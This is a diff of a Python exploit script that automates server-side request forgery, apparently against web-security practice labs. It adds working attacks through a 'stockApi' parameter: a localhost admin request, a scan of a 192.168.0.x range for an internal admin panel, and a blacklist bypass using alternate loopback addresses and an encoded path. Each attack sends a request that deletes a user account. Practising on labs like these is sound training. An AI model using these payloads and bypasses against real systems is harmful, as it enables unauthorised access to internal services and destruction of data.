@@ -1,6 +1,7 @@
 import requests
 from tabulate import tabulate
 from urllib.parse import urlparse
+from urllib.parse import quote
 
 class textcolor:
     HEADER = '\033[95m'
@@ -18,15 +19,16 @@ class SSRFVulnerability:
     def __init__(self, base_url):
         self.base_url = base_url
 
-    def local_server(self, url):
+    def http_request(self, url):
         payload = {'stockApi': url}
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}
 
         try:
-            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
-            print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+url+"'"+textcolor.ENDC)
-            return 1
+            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
+            return response
 
+        except requests.exceptions.ConnectTimeout as e:
+            return 1
         except requests.exceptions.RequestException as e:
             print("\n"+textcolor.DANGER+"Error occurred: "+textcolor.ENDC)
             print(f"{str(e)}\n")
@@ -34,31 +36,52 @@ class SSRFVulnerability:
             print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
             print(f"{str(e)}\n")
 
+        return 0
+
+    def local_system(self):
+        
+        payloadURL = 'http://localhost/admin/delete?username=carlos'
+        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+        return 1 if self.http_request(payloadURL).content else 0
+
     def internal_system(self):
         try:
             for i in range(1, 256):
 
                 ip = '192.168.0.'+str(i)
-                payload = {'stockApi': 'http://'+ip+':8080'+'/admin'}
-                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}
-
-                response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
+                response = self.http_request('http://'+ip+':8080'+'/admin')
 
                 print(textcolor.OKCYAN+" [*] Checking "+str(ip)+": "+str(response.status_code)+" HTTP status"+textcolor.ENDC,end="\r")
 
-                if response.status_code == 200:
+                if response and response.status_code == 200:
                     print(textcolor.OKGREEN+"\n\n"+ip+": 200 HTTP status"+textcolor.ENDC)
                     payloadURL = 'http://'+ip+':8080'+'/admin/delete?username=carlos'
-                    payload = {'stockApi': payloadURL}
-
-                    try:
-                        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
-                        response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
-                    except requests.exceptions.ConnectTimeout as e:
-                        return 1
+                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+                    return 1 if self.http_request(payloadURL) else 0    
         except:
-            print(textcolor.DANGER+"\nError occured: Check URL and/or Lab properly"+textcolor.ENDC)
+            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
             return 0
+        
+    def blacklist_filter(self):
+        # bypasses for localhost domain
+        bypasses = ['localhost','127.0.0.1', '127.1', '::1', '0:0:0:0:0:0:0:1', '::ffff:127.0.0.1', '127%2e0%2e0%2e1', '127%2e1']
+        try:
+            for i in bypasses:
+                response = self.http_request('http://'+i)
+                print(textcolor.OKCYAN+" [*] trying to bypass using "+str(i)+": "+str(response.status_code)+" HTTP status           "+textcolor.ENDC,end="\r")
+                if response.status_code == 200:
+                    print(textcolor.OKGREEN+"\n\n["+i+"] 200 HTTP status"+textcolor.ENDC)
+                    # url encode twice to bypass the defense
+                    payloadURL = 'http://'+i+'/%61dmin/delete?username=carlos'
+                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+                    response = self.http_request(payloadURL)
+                    return 1 if response.content else 0
+        except:
+            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
+            return 0
+
+def encode(string):
+    return "".join("%{0:0>2x}".format(ord(char)) for char in string)
 
 def validate_url(url):
     parsed_url = urlparse(url)
@@ -69,19 +92,16 @@ def validate_url(url):
 def handle_choice(number, instance):
 
     if number == 1:
-
-        result = instance.local_server('http://localhost/admin/delete?username=carlos')
-        if result:
+        if instance.local_system():
             print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)
 
-    elif number == 2:
-        
-        result = instance.internal_system()
-        if result:
+    elif number == 2:  
+        if instance.internal_system():
             print(textcolor.OKGREEN+"Remote Server: Username Deleted Successfully\n"+textcolor.ENDC)
 
     elif number == 3:
-        print("Placeholder")
+        if instance.blacklist_filter():
+            print(textcolor.OKGREEN+"Blacklist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)
     else:
         print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)
 
